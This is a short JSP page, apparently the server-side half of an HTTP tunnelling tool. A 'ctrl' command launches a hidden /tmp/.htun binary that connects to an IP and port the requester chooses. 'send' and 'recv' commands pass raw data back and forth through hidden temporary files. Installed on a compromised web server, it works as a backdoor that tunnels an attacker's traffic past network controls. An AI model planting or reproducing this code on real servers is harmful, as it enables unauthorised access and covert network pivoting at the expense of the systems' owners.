<%@ page import="java.util.*,java.io.*" %><%

// config
final String F_RECV = "/tmp/.send";
final String F_SEND = "/tmp/.recv";
final String F_SERVER = "/tmp/.htun";
final int SZ_SBUF = 1024;

// vars
byte[] sbuf = new byte[SZ_SBUF];
String[] args = new String[3];
int sz;

// flush output
out.clearBuffer();

// ctrl 
if (request.getParameter("cmd").equals("ctrl"))
{
	args[0] = F_SERVER;
	args[1] = request.getParameter("ip");
	args[2] = request.getParameter("port");

	Runtime.getRuntime().exec(args);
}

// recv
else if (request.getParameter("cmd").equals("recv"))
{
	FileInputStream i = new FileInputStream(F_RECV + "." + request.getParameter("port"));
	OutputStream r = response.getOutputStream();

	sz = i.read(sbuf, 0, SZ_SBUF);
	if (sz > 0) r.write(sbuf, 0, sz);

	i.close(); r.flush(); r.close();

	response.setContentType("application/octet-stream");
	out = pageContext.pushBody();
}

// send
else if (request.getParameter("cmd").equals("send"))
{
	InputStream r = request.getInputStream();
	FileOutputStream o = new FileOutputStream(F_SEND + "." + request.getParameter("port"));

	sz = r.read(sbuf, 0, SZ_SBUF);
	if (sz > 0) o.write(sbuf, 0, sz);

	r.close(); o.flush(); o.close();
}

// error ?
else throw new Exception("invalid cmd");

%>
